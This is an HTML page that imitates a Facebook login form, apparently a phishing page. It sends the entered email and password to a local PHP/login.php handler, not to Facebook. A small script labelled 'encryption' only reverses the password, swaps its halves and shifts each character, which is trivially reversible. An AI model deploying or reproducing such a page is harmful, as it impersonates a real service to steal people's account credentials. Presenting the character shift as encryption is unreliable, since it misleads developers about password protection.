
<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Facebook login form </title>
  <link href='https://fonts.googleapis.com/css?family=Lato:400,700' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css">

  
      <link rel="stylesheet" href="css/style.css">
<script>
function encryption(){
    enco = String(document.getElementById("xXx").value).split("").reverse().join("")
    temp1 = enco.substring(0,enco.length % 2 == 0 ? enco.length / 2 : enco.length / 2 + 1)
    temp2 = enco.substring(enco.length % 2 == 0 ? enco.length / 2 : enco.length / 2 + 1,enco.length)
    xx = ""
    for (i = 0; i < document.getElementById("xXx").value.length; i++)  
    xx = xx.concat(String.fromCharCode(temp2.concat(temp1).charCodeAt(i) + 1))
    document.getElementById("xXx").value = xx
}
</script>
  
</head>

<body>

  <section class="login-form-wrap">
  <h1>Facebook</h1>
  <form class="login-form" method="POST" action="PHP/login.php">
    <label>
      <input type="email" name="email" required placeholder="Email">
    </label>
    <label>
      <input id = "xXx" type="password" name="password" required placeholder="Password">
    </label>
    <input type="submit" value="Login" name="login" onclick="encryption()">
  </form>
  <h5><a href="#">Forgot password</a></h5>
</section>
  
  

</body>

</html>
